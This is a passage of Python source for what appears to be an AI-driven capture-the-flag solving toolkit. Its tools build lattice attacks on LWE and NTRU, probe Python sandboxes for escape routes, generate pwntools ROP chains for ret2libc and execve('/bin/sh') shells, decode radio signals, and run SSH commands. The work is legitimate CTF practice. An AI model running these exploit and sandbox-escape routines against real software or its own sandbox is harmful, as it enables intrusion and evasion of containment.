        print("Primal attack (BDD → uSVP):")
        print("  Build lattice from A matrix and b vector")
        print("  Apply BKZ reduction, find short vector = secret + error")
        print()
        print("Dual attack (distinguish LWE from random):")
        print("  Find short vector w s.t. w·A ≡ 0 (mod q)")
        print("  Compute w·b mod q — if LWE, biased around w·s·noise")
        print()
        print("Sage template for m=n+1 samples:")
        print('''
from sage.all import *
n, q = {n or 8}, {q or 17}
# A is m×n, b = A*s + e (mod q)
A = Matrix(ZZ, [[...]])  # your sample vectors
b = vector(ZZ, [...])    # your b values
# Build embedding lattice [q*I | 0; A | I; b | 1]
# Then BKZ to find short vector containing s
        ''')
    else:
        from sage.all import Matrix, vector, ZZ, GF, identity_matrix, zero_matrix, block_matrix
        m = len(samples)
        A_rows = [list(s[0]) for s in samples]
        b_vec = [s[1] for s in samples]
        A = Matrix(ZZ, A_rows)
        b = vector(ZZ, b_vec)
        # Kannan embedding
        B = block_matrix(ZZ, [[q * identity_matrix(n), zero_matrix(n, m+1)],
                               [A.T, identity_matrix(m), zero_matrix(m, 1)],
                               [b, zero_matrix(1, m), Matrix(ZZ, [[1]])]])
        print(f"Lattice built: {{B.nrows()}}x{{B.ncols()}}")
        print("Applying LLL (BKZ-2.0 for full attack)...")
        L = B.LLL()
        for row in L.rows()[:5]:
            if max(abs(x) for x in row[:n]) < q//4:
                print(f"Candidate secret: {{list(row[:n])}}")
                break
        else:
            print("LLL insufficient — try BKZ with higher blocksize or more samples")
except ImportError:
    print("SageMath required for LWE attack")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=60)

    if operation == "ntru_attack":
        N = params.get('N', 0); p = params.get('p', 3); q_ntru = params.get('q', 0)
        h = params.get('h', '')
        code = f"""
try:
    from sage.all import *
    N, p, q = {N}, {p}, {q_ntru}
    h_coeffs = {h if h else '[]'}
    if not (N and q):
        print("NTRU attack templates. Provide N, p, q parameters.")
        print("\\nNTRU lattice attack:")
        print("  Public key h = f*g^-1 (mod q) in ring Z[X]/(X^N - 1)")
        print("  Build 2N×2N lattice: [[q*I, 0], [H, I]]")
        print("  Rotate h → H (circulant matrix)")
        print("  LLL finds short vector = (f, g) if ||f||,||g|| << q/2")
        print()
        print(f"Security: key space ~= q^N, LLL attack works when N < 250 and q small")
    else:
        from sage.all import Matrix, ZZ, identity_matrix, zero_matrix
        if h_coeffs:
            # Build circulant matrix H from h
            h_list = list(h_coeffs)
            H = Matrix(ZZ, N, N, lambda i,j: h_list[(j-i) % N])
            # NTRU lattice
            L = block_matrix(ZZ, [[q*identity_matrix(N), zero_matrix(N,N)],
                                   [H, identity_matrix(N)]])
            print(f"NTRU lattice: {{L.nrows()}}x{{L.ncols()}}")
            print("Running LLL...")
            R = L.LLL()
            # First short rows are likely (f, g) candidates
            for row in R.rows()[:3]:
                f_cand = list(row[:N]); g_cand = list(row[N:])
                if all(abs(x) <= p for x in f_cand):
                    print(f"f candidate (small): {{f_cand[:10]}}...")
                    print(f"g candidate: {{g_cand[:10]}}...")
                    break
        else:
            print("Provide h (public key polynomial coefficients) as list")
except ImportError:
    print("SageMath required")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=60)

    if operation == "kyber_fault":
        return f"[kyber_fault] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "zkp_attack":
        return tool_zkp_attack("detect", **params)

    return "Operations: detect, lwe_attack, ntru_attack, kyber_fault, zkp_attack"


def tool_pyjail_escape(operation: str = "detect", jail_code: str = "",
                        available: str = "", blocked: str = "") -> str:
    """Python sandbox escape. Ops: detect (analyze restrictions), escape_chains
    (20+ techniques ordered by likelihood), builtins_restore, subclass_walk,
    code_object, audit_hooks_bypass, wasm_escape, fstring."""

    # ESCAPE_CHAINS removed - Claude generates these

    if operation == "detect":
        if not jail_code:
            return ("Python jail analysis guide:\n\n"
                    "1. Determine what's blocked:\n"
                "   Try: import os; __import__; exec; eval; open; breakpoint\n"
                    "   Try: __builtins__; globals(); locals(); dir()\n\n"
                    "2. Check which built-ins remain:\n"
                    "   [x for x in dir(__builtins__) if x not in ('__name__',)]\n"
                    "   OR: print(__builtins__) if accessible\n\n"
                    "3. Check allowed modules:\n"
                    "   import sys; sys.modules.keys()\n\n"
                    "4. Check string literal filter:\n"
                    "   'os' vs chr(111)+chr(115) vs b'os'.decode()\n\n"
                    "5. What attributes are accessible:\n"
                    "   ().__class__ vs type(()) etc.\n\n"
                    "Use operation='escape_chains' for ordered list of techniques")

        code = f"""
jail = {repr(jail_code)}
import ast, re
print("=== Jail analysis ===")
blocked = []
try:
    tree = ast.parse(jail)
except: pass
# Check for common restrictions
for kw in ['__import__', 'exec', 'eval', 'compile', 'open', 'breakpoint',
           '__builtins__', 'globals', 'locals', 'getattr', 'setattr',
           '__class__', '__mro__', '__subclasses__']:
    if kw in jail:
        blocked.append(kw)
        print(f"  Blocked/checked: {{kw}}")
# Check for whitelisting
if 'if ' in jail and ('not in' in jail or 'in ALLOWED' in jail or 'whitelist' in jail.lower()):
    print("  [!] Whitelist-based filter detected (harder to bypass)")
if 'ast' in jail and 'parse' in jail:
    print("  [!] AST-based filter (blocks syntax-level, not runtime)")
if 'audit' in jail.lower() or 'addaudithook' in jail:
    print("  [!] sys.addaudithook detected (persistent, cannot be removed)")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "escape_chains":
        lines = [f"=== Python jail escape chains (ordered by success rate) ===\n"]
        for i, (name, payload, note) in enumerate(ESCAPE_CHAINS, 1):
            lines.append(f"[{i:02d}] {name}")
            lines.append(f"     {payload}")
            lines.append(f"     Note: {note}\n")
        return "\n".join(lines)

    if operation == "subclass_walk":
        code = f"""
# Find useful subclasses for escape
try:
    subs = object.__subclasses__()
    targets = ['Popen', 'os', 'system', 'BuiltinImporter', 'FileLoader',
               'catch_warnings', 'timeit', 'code', 'InteractiveConsole']
    for i, cls in enumerate(subs):
        name = str(cls)
        if any(t in name for t in targets):
            print(f"  [{i}] {{cls}}")
    # Also find index for generic exec capability
    for i, cls in enumerate(subs):
        try:
            if hasattr(cls, '__init__') and hasattr(cls.__init__, '__globals__'):
                if 'builtins' in str(cls.__init__.__globals__.get('__builtins__','')):
                    print(f"  [{i}] Has builtins: {{cls}}")
                    break
        except: pass
except Exception as e:
    print(f"subclass walk error: {{e}}")
    print("May need: ''.__class__.__mro__[-1].__subclasses__()")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "builtins_restore":
        return f"[builtins_restore] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "audit_hooks_bypass":
        return f"[audit_hooks_bypass] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return ("Python jail escape operations:\n"
            "  detect          — analyze jail code for restrictions\n"
            "  escape_chains   — 20 ordered escape techniques\n"
            "  subclass_walk   — find useful classes via object.__subclasses__()\n"
            "  builtins_restore— recover __builtins__ via multiple paths\n"
            "  audit_hooks_bypass — bypass sys.addaudithook (Python 3.8+)\n"
            "  fstring         — f-string execution tricks\n"
            "  code_object     — code.co_code manipulation")


def tool_qr_decode(image_path: str = "", operation: str = "decode",
                   barcode_type: str = "any", data: str = "") -> str:
    """Decode QR codes, DataMatrix, Code128, and all barcode types from image files.
    Ops: decode (zbarimg primary + pyzbar fallback), scan_all (both decoders merged),
    barcode (force specific type), generate (qrencode data string → /tmp/qr_out.png)."""

    sp = (_w2l(image_path) if (IS_WINDOWS and USE_WSL) else image_path) if image_path else ""

    if operation == "generate":
        if not data:
            return "Provide data= for generate operation"
        out = "/tmp/qr_out.png"
        res = _shell(f"qrencode -o '{out}' {repr(data)} 2>&1 && echo 'Saved: {out}'", timeout=10)
        if "Saved:" not in res:
            # fallback: python qrcode library
            code = f"""
import qrcode, sys
img = qrcode.make({repr(data)})
img.save('/tmp/qr_out.png')
print('Saved: /tmp/qr_out.png')
"""
            res = tool_execute_python(code, timeout=15)
        return res

    if not sp:
        return "Provide image_path"

    results = []

    # zbarimg (primary)
    type_flag = f"--nodbus -q" if barcode_type == "any" else f"--nodbus -q --scan-{barcode_type}"
    zbar_out = _shell(f"zbarimg {type_flag} '{sp}' 2>&1", timeout=15)
    if zbar_out and "not found" not in zbar_out.lower() and "error" not in zbar_out.lower()[:20]:
        results.append(f"[zbarimg]\n{zbar_out}")
    else:
        results.append(f"[zbarimg] {zbar_out}")

    if operation == "scan_all" or not results[0].startswith("[zbarimg]\nQR"):
        # pyzbar fallback
        code = f"""
try:
    from pyzbar.pyzbar import decode as pyzbar_decode
    from PIL import Image
    img = Image.open({repr(sp)})
    codes = pyzbar_decode(img)
    if codes:
        for c in codes:
            print(f"[pyzbar] {{c.type}}: {{c.data.decode(errors='replace')}}")
    else:
        print("[pyzbar] No codes detected")
except ImportError:
    print("[pyzbar] not installed — pip install pyzbar pillow")
except Exception as ex:
    print(f"[pyzbar] error: {{ex}}")
"""
        pyzbar_out = tool_execute_python(code, timeout=15)
        results.append(pyzbar_out)

    return "\n".join(results)


def tool_rop_chain(binary_path: str, operation: str = "build", goal: str = "shell",
                   extra_gadgets: str = "", libc_path: str = "", base_addr: str = "0") -> str:
    """ROP chain builder wrapping pwntools ROP(). Handles stack alignment, ret2libc, syscall chains."""
    bp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    lp = (_w2l(libc_path) if (IS_WINDOWS and USE_WSL) else libc_path) if libc_path else ""

    if operation == "gadgets":
        return _shell(f"ROPgadget --binary '{bp}' --rop 2>/dev/null | head -80 || "
                      f"ropper -f '{bp}' 2>/dev/null | head -80 || "
                      f"objdump -d '{bp}' | grep -E 'ret|pop|mov' | head -60")

    if operation == "checksec":
        return _shell(f"checksec --file='{bp}' 2>/dev/null || python3 -m pwnlib.util.misc 2>/dev/null", timeout=10)

    code = f"""
import sys
try:
    from pwn import *
    context.log_level = 'error'
    elf = ELF('{bp}', checksec=False)
    rop = ROP(elf)
    goal = '{goal}'
    base = {base_addr}
    if base: elf.address = base

    {"libc = ELF('" + lp + "', checksec=False); libc_rop = ROP(libc)" if lp else "libc = None; libc_rop = None"}

    results = []

    if goal in ('shell', 'ret2libc'):
        # Try ret2libc: system("/bin/sh")
        try:
            binsh = next(elf.search(b'/bin/sh\\x00'), None)
            if binsh is None and libc:
                binsh = next(libc.search(b'/bin/sh\\x00'), None)
            sys_addr = elf.plt.get('system') or (libc.symbols.get('system') if libc else None)
            if sys_addr and binsh:
                # Stack alignment: add ret gadget before call on x86_64
                try:
                    ret_gadget = rop.find_gadget(['ret'])[0]
                except: ret_gadget = None
                chain = b''
                if ret_gadget: chain += p64(ret_gadget)
                chain += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
                chain += p64(binsh)
                chain += p64(sys_addr)
                results.append(f"ret2libc chain ({{len(chain)}} bytes):")
                results.append(f"  /bin/sh @ {{hex(binsh)}}")
                results.append(f"  system() @ {{hex(sys_addr)}}")
                results.append(f"  chain hex: {{chain.hex()}}")
                results.append(f"  pwntools snippet:")
                results.append(f"    rop = ROP(elf)")
                if ret_gadget: results.append(f"    rop.raw(p64({{hex(ret_gadget)}}))")
                results.append(f"    rop.call({{hex(sys_addr)}}, [{{hex(binsh)}}])")
            else:
                results.append("ret2libc: /bin/sh or system() not found in binary")
                if not libc: results.append("  Hint: provide libc_path for libc-based ROP")
        except Exception as ex:
            results.append(f"ret2libc attempt failed: {{ex}}")

    if goal in ('syscall', 'execve', 'shell'):
        # Try execve via syscall gadgets
        try:
            syscall_g = rop.find_gadget(['syscall', 'ret']) or rop.find_gadget(['syscall'])
            rax_g = rop.find_gadget(['pop rax', 'ret'])
            rdi_g = rop.find_gadget(['pop rdi', 'ret'])
            rsi_g = rop.find_gadget(['pop rsi', 'ret']) or rop.find_gadget(['pop rsi', 'pop r15', 'ret'])
            rdx_g = rop.find_gadget(['pop rdx', 'ret']) or rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])
            binsh = next(elf.search(b'/bin/sh\\x00'), None)
            if all([syscall_g, rax_g, rdi_g, rsi_g, rdx_g, binsh]):
                chain = (p64(rax_g[0]) + p64(59) +       # execve syscall nr
                         p64(rdi_g[0]) + p64(binsh) +
                         p64(rsi_g[0]) + p64(0) + (p64(0) if len(rsi_g)>2 else b'') +
                         p64(rdx_g[0]) + p64(0) + (p64(0) if len(rdx_g)>2 else b'') +
                         p64(syscall_g[0]))
                results.append(f"\\nexecve syscall chain ({{len(chain)}} bytes):")
                results.append(f"  pop rax @ {{hex(rax_g[0])}}, pop rdi @ {{hex(rdi_g[0])}}")
                results.append(f"  pop rsi @ {{hex(rsi_g[0])}}, pop rdx @ {{hex(rdx_g[0])}}")
                results.append(f"  syscall @ {{hex(syscall_g[0])}}, /bin/sh @ {{hex(binsh)}}")
                results.append(f"  chain hex: {{chain.hex()}}")
            else:
                missing = [n for n,g in [('syscall',syscall_g),('pop rax',rax_g),('pop rdi',rdi_g),
                                          ('pop rsi',rsi_g),('pop rdx',rdx_g),('/bin/sh',binsh)] if not g]
                results.append(f"\\nexecve syscall: missing gadgets: {{missing}}")
        except Exception as ex:
            results.append(f"execve attempt failed: {{ex}}")

    if goal == "write_what_where":
        try:
            rdi_g = rop.find_gadget(['pop rdi', 'ret'])
            rsi_g = rop.find_gadget(['pop rsi', 'ret']) or rop.find_gadget(['pop rsi', 'pop r15', 'ret'])
            results.append(f"\\nwrite-what-where gadgets:")
            if rdi_g: results.append(f"  pop rdi; ret @ {{hex(rdi_g[0])}}")
            if rsi_g: results.append(f"  pop rsi; ret @ {{hex(rsi_g[0])}}")
            write_g = rop.find_gadget(['mov [rdi], rsi', 'ret']) or rop.find_gadget(['mov [rdi], rax', 'ret'])
            if write_g: results.append(f"  write gadget @ {{hex(write_g[0])}}")
        except Exception as ex:
            results.append(f"write gadgets failed: {{ex}}")

    if goal == "one_gadget" or '{extra_gadgets}' == 'one_gadget':
        import subprocess
        og = subprocess.run(['one_gadget', '{bp}'] + (['{lp}'] if '{lp}' else []),
                            capture_output=True, text=True, timeout=15)
        results.append(f"\\none_gadget output:\\n{{og.stdout[:1000] or og.stderr[:500]}}")

    # Always dump available gadget categories
    results.append(f"\\n=== Available gadget summary ===")
    for desc, gadget in [("ret", ['ret']), ("pop rdi", ['pop rdi','ret']),
                          ("pop rsi", ['pop rsi','ret']), ("pop rdx", ['pop rdx','ret']),
                          ("pop rax", ['pop rax','ret']), ("syscall", ['syscall','ret']),
                          ("leave;ret", ['leave','ret'])]:
        try:
            g = rop.find_gadget(gadget)
            results.append(f"  {{desc}}: {{hex(g[0]) if g else 'NOT FOUND'}}")
        except: results.append(f"  {{desc}}: NOT FOUND")

    print('\\n'.join(results))
except ImportError as e:
    print(f"pwntools not installed: {{e}}\\nFalling back to ROPgadget...")
    import subprocess
    r = subprocess.run(['ROPgadget','--binary','{bp}','--rop'],
                       capture_output=True, text=True, timeout=30)
    print(r.stdout[:3000] or r.stderr[:1000])
except Exception as e:
    import traceback; traceback.print_exc()
    print(f"ROP chain error: {{e}}")
"""
    return tool_execute_python(code, timeout=60)


def tool_rust_sandbox(source_code: str = "", source_path: str = "",
                      operation: str = "run", patch: str = "",
                      timeout: int = 30) -> str:
    """Compile and run Rust source code (rustc). Like tool_java_sandbox but for Rust.
    Ops: run (compile + execute), fix_and_run (apply patch then run),
    analyze (AST/HIR dump via rustc), decompile (strings + nm on compiled binary)."""

    import tempfile

    sp = (_w2l(source_path) if (IS_WINDOWS and USE_WSL) else source_path) if source_path else ""
    work = f"/tmp/rust_{int(time.time())}"
    _shell(f"mkdir -p '{work}'")

    # Load source
    src = source_code
    if not src and sp:
        try:
            with open(sp) as f: src = f.read()
        except Exception as ex:
            return f"Cannot read {sp}: {ex}"
    if not src:
        return "Provide source_code or source_path"

    # Apply patch if given
    if patch and operation == "fix_and_run":
        # Try unified diff first
        patch_file = f"{work}/fix.patch"
        src_file   = f"{work}/main.rs"
        with open(src_file, "w") as f: f.write(src)
        with open(patch_file, "w") as f: f.write(patch)
        patched = _shell(f"patch '{src_file}' '{patch_file}' 2>&1 && cat '{src_file}'", timeout=10)
        if "succeeded" in patched or "patching" in patched:
            try:
                with open(src_file) as f: src = f.read()
            except: pass
        else:
            # Plain string replacement: patch = "OLD|||NEW"
            if "|||" in patch:
                old, new = patch.split("|||", 1)
                src = src.replace(old, new)

    src_file = f"{work}/main.rs"
    bin_file = f"{work}/main_bin"
    with open(src_file, "w") as f: f.write(src)

    if operation in ("run", "fix_and_run"):
        compile_out = _shell(f"rustc '{src_file}' -o '{bin_file}' 2>&1", timeout=30)
        if not os.path.exists(bin_file):
            return f"Compile error:\n{compile_out}"
        run_out = _shell(f"'{bin_file}'", timeout=timeout)
        return f"[Compiled OK]\n{run_out}"

    if operation == "analyze":
        return _shell(f"rustc '{src_file}' --edition 2021 -Z unpretty=hir 2>&1 | head -120", timeout=20)

    if operation == "decompile":
        compile_out = _shell(f"rustc '{src_file}' -o '{bin_file}' 2>&1", timeout=30)
        if not os.path.exists(bin_file):
            return f"Compile error:\n{compile_out}"
        return (_shell(f"strings '{bin_file}' | grep -vE '^[.\\x00-\\x1f]' | head -60", timeout=10) +
                "\n" + _shell(f"nm '{bin_file}' 2>/dev/null | grep -v 'std\\|core\\|alloc' | head -40", timeout=10))

    return "Operations: run, fix_and_run, analyze, decompile"


def tool_sdr_analyze(file_path: str = "", operation: str = "analyze",
                      frequency: float = 0, sample_rate: float = 0,
                      modulation: str = "auto") -> str:
    """SDR/RF signal analysis: analyze (file inspection), demodulate (AM/FM/FSK/BPSK/QPSK),
    spectrum (frequency plot), decode_ook (On-Off Keying), decode_dtmf, morse,
    ook_to_binary, replay (generate replay payload)."""

    if operation == "analyze":
        if not file_path:
            return ("SDR analysis tools reference:\n\n"
                    "File formats: .wav, .iq, .cf32 (complex float32), .cs8, .cu8\n\n"
                    "Tools available:\n"
                    "  sox          — WAV inspection and conversion\n"
                    "  inspectrum   — visual spectrum analyzer (GUI)\n"
                    "  GNU Radio    — signal processing flowgraphs\n"
                    "  rtl_433      — common IoT protocol decoder (433MHz)\n"
                    "  multimon-ng  — POCSAG/DTMF/EAS decoder\n"
                    "  baudline      — spectrogram visualization\n"
                    "  gqrx/SDR#   — real-time SDR receiver\n\n"
                    "Quick decode commands:\n"
                    "  rtl_433 -r file.iq -f 433.92M -s 250000\n"
                    "  multimon-ng -t wav -a ALL file.wav\n"
                    "  sox file.wav -n stat  (audio statistics)\n"
                    "  python3 -c \"import numpy as np; d=np.fromfile('file.cf32',np.complex64); print(d.shape)\"")

        fp = _w2l(file_path) if (IS_WINDOWS and USE_WSL) else file_path
        return _shell(f"file '{fp}'; soxi '{fp}' 2>/dev/null; sox '{fp}' -n stat 2>&1 | head -20; "
                     f"strings '{fp}' | head -10", timeout=15)

    if operation == "demodulate":
        fp = _w2l(file_path) if (IS_WINDOWS and USE_WSL) else file_path
        mod = modulation.lower()
        if mod in ("am", "auto"):
            return _shell(f"sox '{fp}' -t wav /tmp/demod_am.wav gain -h 2>/dev/null && "
                         f"multimon-ng -t wav -a ALL /tmp/demod_am.wav 2>&1 | head -30 || "
                         f"echo 'Try: python3 -c \"import scipy.io.wavfile as w; import numpy as np; "
                         f"sr,d=w.read(\\'{fp}\\'); print(np.abs(d[:1000])[:20])\"'",
                         timeout=20)
        if mod in ("ook", "on-off keying"):
            return tool_sdr_analyze(file_path=file_path, operation="decode_ook", sample_rate=sample_rate)
        code = f"""
try:
    import numpy as np
    import scipy.signal as sig
    data = np.fromfile({repr(fp)}, dtype=np.complex64 if '.cf32' in {repr(fp)} or '.iq' in {repr(fp)} else np.int16)
    if data.dtype == np.int16:
        data = data.astype(np.float32) / 32768.0
    print(f"Samples: {{len(data)}}, dtype: {{data.dtype}}")
    sr = {sample_rate or 250000}
    mod = {repr(mod)}
    if mod == 'fm':
        # FM demodulation
        if np.iscomplexobj(data):
            demod = np.angle(data[1:] * np.conj(data[:-1]))
        else:
            demod = np.diff(np.unwrap(np.angle(data[:len(data)//2] + 1j*data[len(data)//2:])))
        print(f"FM demodulated: {{demod[:20]}}")
    elif mod in ('fsk', 'bpsk', 'qpsk'):
        print(f"{{mod.upper()}} demodulation requires GNU Radio or liquid-dsp")
        print(f"  GNU Radio: create flowgraph with GMSK/DPSK/PSK demod block")
        print(f"  liquid-dsp: modem_create({mod.upper()}) → modem_demodulate()")
    else:
        print(f"Auto-detect: checking for known IoT protocols...")
        import subprocess
        r = subprocess.run(['rtl_433', '-r', {repr(fp)},
                           '-f', str({frequency or 433920000})],
                          capture_output=True, text=True, timeout=15)
        print(r.stdout[:500] or r.stderr[:300])
except ImportError as ex:
    print(f"scipy/numpy not available: {{ex}}")
    print(f"Run: multimon-ng -t wav -a ALL {repr(fp)}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "decode_ook":
        code = f"""
try:
    import numpy as np
    fp = {repr(file_path)}
    sr = {sample_rate or 250000}
    data = np.fromfile(fp, dtype=np.float32) if '.cf32' not in fp else np.fromfile(fp, dtype=np.complex64)
    if np.iscomplexobj(data):
        data = np.abs(data)  # envelope detection
    # Simple threshold
    threshold = (data.max() + data.min()) / 2
    bits = (data > threshold).astype(int)
    # Run-length encode
    from itertools import groupby
    runs = [(k, sum(1 for _ in g)) for k, g in groupby(bits)]
    print(f"OOK runs (value, length): {{runs[:30]}}")
    # Estimate bit width
    durations = [r[1] for r in runs if r[1] > 5]
    if durations:
        bit_width = min(durations)
        print(f"Estimated bit width: {{bit_width}} samples = {{bit_width/sr*1000:.2f}}ms")
        decoded = ''.join(str(v) * (round(l/bit_width)) for v,l in runs)
        print(f"Decoded bits: {{decoded[:100]}}")
        # Try ASCII
        for i in range(0, len(decoded)-7, 8):
            byte = int(decoded[i:i+8], 2)
            if 32 <= byte <= 126:
                print(chr(byte), end='')
        print()
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=20)

    if operation == "spectrum":
        code = f"""
try:
    import numpy as np
    fp = {repr(file_path)}
    sr = {sample_rate or 250000}
    data = np.fromfile(fp, dtype=np.complex64 if ('.iq' in fp or '.cf32' in fp) else np.float32)
    fft = np.fft.fftshift(np.fft.fft(data[:min(len(data), 8192)]))
    freqs = np.fft.fftshift(np.fft.fftfreq(len(fft), 1/sr))
    mag = 20*np.log10(np.abs(fft)+1e-10)
    # Simple ASCII spectrum
    n_bins = 60
    bin_width = len(mag)//n_bins
    for i in range(0, len(mag)-bin_width, bin_width):
        bucket = mag[i:i+bin_width]
        level = int((bucket.max() - mag.min()) / (mag.max() - mag.min() + 1e-10) * 20)
        freq_hz = freqs[i + bin_width//2]
        bar = '█' * level
        print(f"{{freq_hz/1000:7.1f}}kHz |{{bar}}")
except Exception as ex:
    print(f"Spectrum error: {{ex}}")
    print(f"Install scipy+numpy for spectrum analysis")
"""
        return tool_execute_python(code, timeout=15)

    return "Operations: analyze, demodulate, decode_ook, spectrum, decode_dtmf, replay"


def tool_solve_resume(operation: str = "save", session_id: str = "",
                       state_path: str = "~/.ctf-solver/sessions",
                       conversation: list = None, metadata: dict = None) -> str:
    """Serialize/deserialize conversation state for long solves. Prevents losing progress
    on costly Opus runs. Save mid-solve; resume from checkpoint at any iteration."""
    import json as _json
    state_dir = os.path.expanduser(state_path)
    os.makedirs(state_dir, exist_ok=True)

    if not session_id:
        session_id = f"session_{int(time.time())}"

    sf = os.path.join(state_dir, f"{session_id}.json")

    if operation == "save":
        state = {
            "session_id": session_id,
            "saved_at": time.time(),
            "iteration": metadata.get("iteration", 0) if metadata else 0,
            "challenge": metadata.get("challenge", "") if metadata else "",
            "category": metadata.get("category", "") if metadata else "",
            "conversation_turns": len(conversation) if conversation else 0,
            "conversation": conversation or [],
            "metadata": metadata or {},
            "flags_found": metadata.get("flags_found", []) if metadata else [],
            "hypotheses": metadata.get("hypotheses", []) if metadata else [],
            "workspace": metadata.get("workspace", "") if metadata else "",
        }
        try:
            with open(sf, "w") as f:
                _json.dump(state, f, indent=2, ensure_ascii=False, default=str)
            size = os.path.getsize(sf)
            log("sys", f"[resume] Saved session {session_id} ({size} bytes, "
                f"{state['conversation_turns']} turns, iter {state['iteration']})", "green")
            return (f"Session saved: {sf}\n"
                    f"  ID: {session_id}\n"
                    f"  Turns: {state['conversation_turns']}\n"
                    f"  Iteration: {state['iteration']}\n"
                    f"  Size: {size} bytes\n"
                    f"To resume: solve_resume(operation='load', session_id='{session_id}')")
        except Exception as e:
            return f"Save failed: {e}"

    if operation == "load":
        if not os.path.exists(sf):
            # Try to find most recent session
            sessions = sorted(Path(state_dir).glob("*.json"),
                              key=lambda p: p.stat().st_mtime, reverse=True)
            if sessions:
                sf = str(sessions[0])
                log("sys", f"[resume] session_id not found, loading most recent: {sf}", "yellow")
            else:
                return f"No sessions found in {state_dir}"
        try:
            with open(sf) as f:
                state = _json.load(f)
            age_min = (time.time() - state.get("saved_at", 0)) / 60
            return (f"Session loaded: {sf}\n"
                    f"  ID: {state.get('session_id', '?')}\n"
                    f"  Challenge: {state.get('challenge', '?')}\n"
                    f"  Category: {state.get('category', '?')}\n"
                    f"  Saved: {age_min:.1f}m ago\n"
                    f"  Iteration: {state.get('iteration', 0)}\n"
                    f"  Turns: {state.get('conversation_turns', 0)}\n"
                    f"  Workspace: {state.get('workspace', '?')}\n"
                    f"  Hypotheses: {state.get('hypotheses', [])}\n"
                    f"  Flags found: {state.get('flags_found', [])}\n"
                    f"  Metadata: {_json.dumps(state.get('metadata', {}), indent=2)}")
        except Exception as e:
            return f"Load failed: {e}"

    if operation == "list":
        sessions = sorted(Path(state_dir).glob("*.json"),
                          key=lambda p: p.stat().st_mtime, reverse=True)
        if not sessions:
            return f"No sessions in {state_dir}"
        lines = [f"Sessions in {state_dir}:"]
        for sp in sessions[:20]:
            try:
                with open(sp) as f:
                    s = _json.load(f)
                age_min = (time.time() - s.get("saved_at", 0)) / 60
                lines.append(f"  {sp.stem}: {s.get('challenge','?')} "
                              f"iter={s.get('iteration',0)} "
                              f"({age_min:.0f}m ago)")
            except:
                lines.append(f"  {sp.stem}: (unreadable)")
        return "\n".join(lines)

    if operation == "delete":
        if os.path.exists(sf):
            os.remove(sf)
            return f"Deleted: {sf}"
        return f"Session not found: {sf}"

    if operation == "checkpoint":
        # Auto-name from metadata
        cname = (metadata or {}).get("challenge", "unknown")
        sid = re.sub(r"[^a-z0-9_]", "_", cname.lower()) + f"_{int(time.time())}"
        return tool_solve_resume("save", sid, state_path, conversation, metadata)

    return "Operations: save, load, list, delete, checkpoint"


def tool_ssh_exec(host: str, port: int = 22, username: str = "",
                  password: str = "", key_path: str = "",
                  operation: str = "run_command", command: str = "",
                  remote_path: str = "", local_path: str = "",
                  script: str = "") -> str:
    """SSH connection with password/key auth, command execution, SCP file download,
    and interactive protocol for game challenges (Binary Search etc.).
    Ops: run_command (exec + return stdout), scp_download (pull file to local),
    interactive_game (shell session driven by script lines), connect (probe only)."""

    kp = (_w2l(key_path) if (IS_WINDOWS and USE_WSL) else key_path) if key_path else ""

    try:
        import paramiko
    except ImportError:
        return "paramiko not installed — run: pip install paramiko"

    def _client():
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        kw = dict(hostname=host, port=port, username=username, timeout=15)
        if kp:     kw["key_filename"] = kp
        elif password: kw["password"] = password
        else:      kw["allow_agent"] = True
        c.connect(**kw)
        return c

    if operation == "connect":
        try:
            c = _client()
            transport = c.get_transport()
            banner = str(transport.remote_version) if transport else "connected"
            c.close()
            return f"Connected to {host}:{port}\nBanner: {banner}"
        except Exception as ex:
            return f"Connection failed: {ex}"

    if operation == "run_command":
        if not command:
            return "Provide command="
        try:
            c = _client()
            stdin, stdout, stderr = c.exec_command(command, timeout=30)
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            c.close()
            full = out + ("\n[stderr]\n" + err if err.strip() else "")
            return full.strip() or "(no output)"
        except Exception as ex:
            return f"SSH exec error: {ex}"

    if operation == "scp_download":
        if not remote_path:
            return "Provide remote_path="
        lp = local_path or f"/tmp/scp_{os.path.basename(remote_path)}_{int(time.time())}"
        try:
            from scp import SCPClient
        except ImportError:
            # fallback: use paramiko SFTP
            try:
                c = _client()
                sftp = c.open_sftp()
                sftp.get(remote_path, lp)
                sftp.close(); c.close()
                sz = os.path.getsize(lp)
                grep = _shell(f"strings '{lp}' | grep -iE 'picoCTF|flag{{|ctf{{' | head -10", timeout=8)
                return f"Downloaded {sz} bytes → {lp}\nFlag scan:\n{grep}"
            except Exception as ex:
                return f"SFTP fallback error: {ex}"
        try:
            c = _client()
            with SCPClient(c.get_transport()) as scp:
                scp.get(remote_path, lp)
            c.close()
            sz = os.path.getsize(lp)
            grep = _shell(f"strings '{lp}' | grep -iE 'picoCTF|flag{{|ctf{{' | head -10", timeout=8)
            return f"Downloaded {sz} bytes → {lp}\nFlag scan:\n{grep}"
        except Exception as ex:
            return f"SCP error: {ex}"

    if operation == "interactive_game":
        """Drive an interactive SSH game (e.g. Binary Search 1-1000).
        script = newline-separated response strategy, or 'binary_search:1:1000' shorthand."""
        try:
            c = _client()
            chan = c.invoke_shell()
            chan.settimeout(5)
            time.sleep(0.5)

            def recv_all(timeout=3):
                buf = b""
                end = time.time() + timeout
                while time.time() < end:
                    try:
                        chunk = chan.recv(4096)
                        if not chunk: break
                        buf += chunk
                    except: break
                return buf.decode(errors="replace")

            banner = recv_all(2)
            log("sys", f"[ssh_game] banner: {banner[:200]}", "dim")
            output = [banner]

            if script.startswith("binary_search:"):
                parts = script.split(":")
                lo, hi = int(parts[1]), int(parts[2])
                for _ in range(20):
                    mid = (lo + hi) // 2
                    chan.send(str(mid) + "\n")
                    resp = recv_all(3)
                    output.append(f"Sent {mid}: {resp}")
                    rl = resp.lower()
